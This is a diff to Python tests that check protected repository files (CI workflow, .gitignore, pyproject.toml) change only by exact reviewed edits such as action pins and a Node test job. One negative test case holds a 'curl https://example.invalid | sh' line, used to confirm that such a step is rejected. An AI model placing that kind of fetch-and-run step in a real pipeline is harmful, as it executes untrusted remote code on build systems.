@@ -87,6 +87,17 @@ def _files(root: Path) -> list[Path]:
     )
 
 
+#: pip writes this distribution's metadata here on an editable install, as CI does. It is
+#: gitignored and its PKG-INFO copies the README, so it is packaging output, not Hermes source.
+_GENERATED_METADATA = "hermes_autonomy.egg-info"
+
+
+def _source_files(root: Path) -> list[Path]:
+    """Every file under ``root`` except this distribution's own generated metadata."""
+    metadata = root / _GENERATED_METADATA
+    return [path for path in _files(root) if metadata not in path.parents]
+
+
 def _label_indices(data: bytes) -> list[int]:
     """Indices of REQUIRED_LABELS found in raw bytes, so a stray non-UTF-8 byte hides nothing."""
     return [
@@ -108,7 +119,7 @@ def _relative(path: Path) -> str:
 
 def test_r1_source_never_references_the_playground() -> None:
     offenders = []
-    for path in _files(SOURCE_ROOT):
+    for path in _source_files(SOURCE_ROOT):
         text = path.read_bytes().decode("utf-8", errors="replace")
         if "playground" in text.lower() or "playground" in _relative(path).lower():
             offenders.append(_relative(path))
@@ -144,11 +155,30 @@ def test_r1_node_pattern_ignores_labels(probe: str) -> None:
 
 def test_r1_source_never_invokes_node() -> None:
     offenders = []
-    for path in _files(SOURCE_ROOT):
+    for path in _source_files(SOURCE_ROOT):
         text = path.read_bytes().decode("utf-8", errors="replace")
         for match in _NODE_INVOCATION.finditer(text):
             offenders.append(f"{_relative(path)}: {match.group(0)}")
     assert offenders == []
+
+
+def test_r1_scan_excludes_only_this_distributions_generated_metadata(tmp_path: Path) -> None:
+    for relative in (
+        "hermes_autonomy.egg-info/PKG-INFO",
+        "other.egg-info/PKG-INFO",
+        "hermes/hermes_autonomy.egg-info/PKG-INFO",
+        "hermes/module.py",
+        "hermes_autonomy.egg-info.py",
+    ):
+        (tmp_path / relative).parent.mkdir(parents=True, exist_ok=True)
+        (tmp_path / relative).write_text("playground\n", encoding="utf-8")
+
+    assert [path.relative_to(tmp_path).as_posix() for path in _source_files(tmp_path)] == [
+        "hermes/hermes_autonomy.egg-info/PKG-INFO",
+        "hermes/module.py",
+        "hermes_autonomy.egg-info.py",
+        "other.egg-info/PKG-INFO",
+    ]
 
 
 def test_r2_playground_holds_no_python_manifest_or_node_modules() -> None:
@@ -220,10 +250,80 @@ def _git(*arguments: str) -> subprocess.CompletedProcess[str]:
     )
 
 
+_REVIEWED_CI_INSTALL = (
+    b"      - name: Install Hermes and development dependencies\n"
+    b'        run: python -m pip install -e ".[dev]"\n',
+    b"      # setup-python has no macOS build of 3.11 after 3.11.9, whose ipaddress predates the\n"
+    b"      # IPv4-mapped loopback fix; run the reference interpreter, CPython 3.11.15, instead.\n"
+    b"      - name: Install CPython 3.11.15 with uv\n"
+    b"        run: |\n"
+    b'          python -m pip install "uv==0.12.24"\n'
+    b"          uv python install --python-preference only-managed 3.11.15\n"
+    b"          uv venv --seed --python-preference only-managed --python 3.11.15"
+    b' "$RUNNER_TEMP/python-3.11.15"\n'
+    b'          "$RUNNER_TEMP/python-3.11.15/bin/python" -c'
+    b' "import sys; assert sys.version_info[:3] == (3, 11, 15), sys.version"\n'
+    b'          echo "$RUNNER_TEMP/python-3.11.15/bin" >> "$GITHUB_PATH"\n'
+    b"\n"
+    b"      - name: Install Hermes and development dependencies\n"
+    b'        run: python -m pip install -e ".[dev,workbench]"\n',
+)
+#: The pins were recorded on Apple-silicon macOS and differ in low-order bits on Linux x86-64.
+_REVIEWED_CI_RUNNER = (
+    b"    runs-on: ubuntu-latest\n",
+    b"    # The numerical pins were recorded on Apple-silicon macOS and differ in low-order bits\n"
+    b"    # on Linux x86-64; only same-host reproduction is claimed,"
+    b" so CI runs on that platform.\n"
+    b"    runs-on: macos-26\n",
+)
+_REVIEWED_CI_LAST_STEP = b'        run: python -m pytest -q -m "not metadrive"\n'
+_REVIEWED_CI_NODE_JOB = (
+    b"\n"
+    b"  fleetlab-node:\n"
+    b"    name: FleetLab Node 22.23.4\n"
+    b"    runs-on: macos-26\n"
+    b"    timeout-minutes: 45\n"
+    b"\n"
+    b"    steps:\n"
+    b"      - name: Check out repository\n"
+    b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
+    b" # v4, verified 2026-10-21\n"
+    b"\n"
+    b"      - name: Set up Python for the City suite\n"
+    b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0\n"
+    b"        with:\n"
+    b'          python-version: "3.11"\n'
+    b"          cache: pip\n"
+    b"\n"
+    b"      - name: Install Hermes and development dependencies\n"
+    b'        run: python -m pip install -e ".[dev]"\n'
+    b"\n"
+    b"      - name: Set up Node\n"
+    b"        uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38"
+    b" # v6.5.0, verified 2026-10-25\n"
+    b"        with:\n"
+    b'          node-version: "22.23.4"\n'
+    b"\n"
+    b"      - name: FleetLab Playground suite\n"
+    b'        run: node --test "playground/fleetlab/test/*.test.mjs"\n'
+    b"\n"
+    b"      - name: FleetLab City suite\n"
+    b"        working-directory: apps/fleetlab-city\n"
+    b"        run: node --test test/*.test.mjs\n"
+    b"\n"
+    b"      - name: FleetLab traffic suite\n"
+    b'        run: node --test "tools/fleetlab-traffic/test/*.test.mjs"\n'
+)
+_REVIEWED_DEV_EXTRA = (
+    b'    "ruff>=0.11,<1",\n]\nworkbench = [\n',
+    b'    "ruff>=0.11,<1",\n    "certifi>=2026.7.22",\n]\nworkbench = [\n',
+)
+
+
 def _matches_reviewed_protected_change(
     relative_path: str, original: bytes, current: bytes
 ) -> bool:
-    """Accept only the exact reviewed media ignores and security transformations."""
+    """Accept only the exact reviewed media ignores, security pins and CI test wiring."""
     expected = original
     if relative_path == ".gitignore":
         marker = b"# Local secrets and operating-system files\n"
@@ -234,6 +334,15 @@ def _matches_reviewed_protected_change(
             b"original full-size inputs remain ignored.\n"
             b"!apps/fleetlab-city/rebalancing-media/r1-nf05.mp4\n"
             b"!apps/fleetlab-city/rebalancing-media/r1-nf06.mp4\n"
+        )
+        if expected.count(b"*.mp4\n") != 1:
+            return False
+        expected = expected.replace(
+            b"*.mp4\n",
+            b"*.mp4\n"
+            b"!/apps/fleetlab-city/enhancement-media/FL-V2-deadhead-explainer.mp4\n"
+            b"!/apps/fleetlab-city/enhancement-media/FL-V3-people-between-rides-loop.mp4\n",
+            1,
         )
     elif relative_path == ".github/workflows/ci.yml":
         for prior, pinned in (
@@ -247,19 +356,32 @@ def _matches_reviewed_protected_change(
                 b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
                 b" # v5.6.0\n",
             ),
+            _REVIEWED_CI_INSTALL,
+            _REVIEWED_CI_RUNNER,
         ):
             if expected.count(prior) != 1:
                 return False
             expected = expected.replace(prior, pinned, 1)
+        # The FleetLab Node job is appended after the original last step, byte for byte.
+        if not expected.endswith(_REVIEWED_CI_LAST_STEP):
+            return False
+        expected += _REVIEWED_CI_NODE_JOB
+    elif relative_path == "pyproject.toml":
+        prior, reviewed = _REVIEWED_DEV_EXTRA
+        if original.count(prior) != 1:
+            return False
+        expected = original.replace(prior, reviewed, 1)
     else:
         return False
     return current == expected
 
 
 def test_r6_reviewed_ignore_change_rejects_unrelated_edits() -> None:
-    original = b"# Local secrets and operating-system files\n.env\n"
+    original = b"# Local secrets and operating-system files\n.env\n*.mp4\n"
     reviewed = (
-        b"# Local secrets and operating-system files\n.wrangler/\n.env\n"
+        b"# Local secrets and operating-system files\n.wrangler/\n.env\n*.mp4\n"
+        b"!/apps/fleetlab-city/enhancement-media/FL-V2-deadhead-explainer.mp4\n"
+        b"!/apps/fleetlab-city/enhancement-media/FL-V3-people-between-rides-loop.mp4\n"
         b"\n# Reviewed R1 teaching concept derivatives; "
         b"original full-size inputs remain ignored.\n"
         b"!apps/fleetlab-city/rebalancing-media/r1-nf05.mp4\n"
@@ -268,6 +390,8 @@ def test_r6_reviewed_ignore_change_rejects_unrelated_edits() -> None:
     assert _matches_reviewed_protected_change(".gitignore", original, reviewed)
     for changed in (
         reviewed + b"!private-notes.md\n",
+        reviewed + b"!/apps/fleetlab-city/enhancement-media/FL-V1-one-fleet-day-film.mp4\n",
+        reviewed + b"!/apps/fleetlab-city/enhancement-media/*.mp4\n",
         reviewed.replace(b".env\n", b"!.env\n"),
         reviewed.replace(b".wrangler/\n", b".wrangler*\n"),
         reviewed.replace(b"\n", b"\r\n"),
@@ -278,28 +402,110 @@ def test_r6_reviewed_ignore_change_rejects_unrelated_edits() -> None:
 def test_r6_reviewed_ci_pins_reject_unrelated_edits() -> None:
     original = (
         b"name: CI\n"
-        b"        uses: actions/checkout@v4\n"
+        + _REVIEWED_CI_RUNNER[0]
+        + b"        uses: actions/checkout@v4\n"
         b"        uses: actions/setup-python@v5\n"
+        + _REVIEWED_CI_INSTALL[0]
+        + _REVIEWED_CI_LAST_STEP
     )
     reviewed = (
         b"name: CI\n"
-        b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
+        + _REVIEWED_CI_RUNNER[1]
+        + b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
         b" # v4, verified 2026-10-21\n"
         b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
         b" # v5.6.0\n"
+        + _REVIEWED_CI_INSTALL[1]
+        + _REVIEWED_CI_LAST_STEP
+        + _REVIEWED_CI_NODE_JOB
     )
     path = ".github/workflows/ci.yml"
     assert _matches_reviewed_protected_change(path, original, reviewed)
     for changed in (
         reviewed + b"permissions: write-all\n",
+        reviewed + b"        run: curl https://example.invalid | sh\n",
         reviewed.replace(b"checkout@11d5960", b"checkout@0000000"),
         reviewed.replace(b"setup-python@a26af69", b"setup-python@0000000"),
+        reviewed.replace(b"setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38", b"setup-node@v6"),
+        reviewed.replace(b'node-version: "22.23.4"', b'node-version: "22"'),
+        reviewed.replace(b'"uv==0.12.24"', b'"uv"'),
+        reviewed.replace(b"--python 3.11.15", b"--python 3.11"),
+        reviewed.replace(b"(3, 11, 15)", b"(3, 11)"),
+        reviewed.replace(b"runs-on: macos-26", b"runs-on: macos-latest"),
+        reviewed.replace(b"runs-on: macos-26", b"runs-on: ubuntu-latest", 1),
+        reviewed.replace(b'".[dev,workbench]"', b'".[dev,workbench,mujoco-cal]"'),
         reviewed.replace(b"name: CI", b"name: Unreviewed"),
+        reviewed.replace(b"\n", b"\r\n"),
+        reviewed[: -len(_REVIEWED_CI_NODE_JOB)],
     ):
         assert not _matches_reviewed_protected_change(path, original, changed)
     assert not _matches_reviewed_protected_change(
         ".github/workflows/other.yml", original, reviewed
     )
+
+
+def test_r6_reviewed_ci_wiring_refuses_a_base_without_exactly_one_anchor() -> None:
+    runner, reviewed_runner = _REVIEWED_CI_RUNNER
+    pins = runner + (
+        b"        uses: actions/checkout@v4\n"
+        b"        uses: actions/setup-python@v5\n"
+    )
+    reviewed_pins = reviewed_runner + (
+        b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
+        b" # v4, verified 2026-10-21\n"
+        b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
+        b" # v5.6.0\n"
+    )
+    install, reviewed_install = _REVIEWED_CI_INSTALL
+    path = ".github/workflows/ci.yml"
+    # Each base would otherwise yield a well-defined expected file; the guards refuse it.
+    for original, current in (
+        (
+            pins + install + install + _REVIEWED_CI_LAST_STEP,
+            reviewed_pins + reviewed_install + install + _REVIEWED_CI_LAST_STEP
+            + _REVIEWED_CI_NODE_JOB,
+        ),
+        (
+            pins + install + _REVIEWED_CI_LAST_STEP + b"      - name: Later step\n",
+            reviewed_pins + reviewed_install + _REVIEWED_CI_LAST_STEP
+            + b"      - name: Later step\n" + _REVIEWED_CI_NODE_JOB,
+        ),
+        (
+            pins + runner + install + _REVIEWED_CI_LAST_STEP,
+            reviewed_pins + runner + reviewed_install + _REVIEWED_CI_LAST_STEP
+            + _REVIEWED_CI_NODE_JOB,
+        ),
+    ):
+        assert not _matches_reviewed_protected_change(path, original, current)
+
+
+def test_r6_reviewed_dev_extra_refuses_a_base_without_exactly_one_anchor() -> None:
+    prior, reviewed = _REVIEWED_DEV_EXTRA
+    path = "pyproject.toml"
+    for original in (b"[project]\n", prior + prior):
+        current = original.replace(prior, reviewed, 1)
+        assert not _matches_reviewed_protected_change(path, original, current)
+
+
+def test_r6_reviewed_dev_extra_rejects_unrelated_edits() -> None:
+    original = (
+        b'dependencies = [\n    "typer>=0.12,<1",\n]\n'
+        b"[project.optional-dependencies]\n"
+        b'dev = [\n    "pytest>=8,<9",\n'
+        + _REVIEWED_DEV_EXTRA[0]
+        + b'    "streamlit>=1.37,<2",\n]\n'
+    )
+    reviewed = original.replace(*_REVIEWED_DEV_EXTRA)
+    path = "pyproject.toml"
+    assert _matches_reviewed_protected_change(path, original, reviewed)
+    for changed in (
+        reviewed.replace(b'"certifi>=2026.7.22"', b'"certifi"'),
+        reviewed.replace(b'"typer>=0.12,<1",\n', b'"typer>=0.12,<1",\n    "certifi>=2026.7.22",\n'),
+        reviewed.replace(b'"certifi>=2026.7.22",\n', b'"certifi>=2026.7.22",\n    "requests",\n'),
+        reviewed.replace(b'"streamlit>=1.37,<2"', b'"streamlit>=1.37"'),
+        reviewed.replace(b"\n", b"\r\n"),
+    ):
+        assert not _matches_reviewed_protected_change(path, original, changed)
 
 
 def test_r6_protected_paths_unchanged_since_base_commit() -> None:
@@ -313,9 +519,10 @@ def test_r6_protected_paths_unchanged_since_base_commit() -> None:
     untracked = _git("ls-files", "--others", "--exclude-standard", "--", *_PROTECTED_PATHS)
     assert untracked.returncode == 0, untracked.stderr
     changed = sorted(set(diff.stdout.split()) | set(untracked.stdout.split()))
-    # Reviewed R1 derivatives, Wrangler-state ignore and exact CI action pins only.
-    # Every other byte in these files, and every other protected path, stays unchanged.
-    for relative_path in (".gitignore", ".github/workflows/ci.yml"):
+    # Reviewed R1/enhancement derivatives, Wrangler-state ignore, exact CI pins, the reviewed
+    # CI test wiring and the certifi dev pin only. Every other byte in these files, and every
+    # other protected path, stays unchanged.
+    for relative_path in (".gitignore", ".github/workflows/ci.yml", "pyproject.toml"):
         if relative_path not in changed:
             continue
         original = _git("show", f"{base}:{relative_path}")
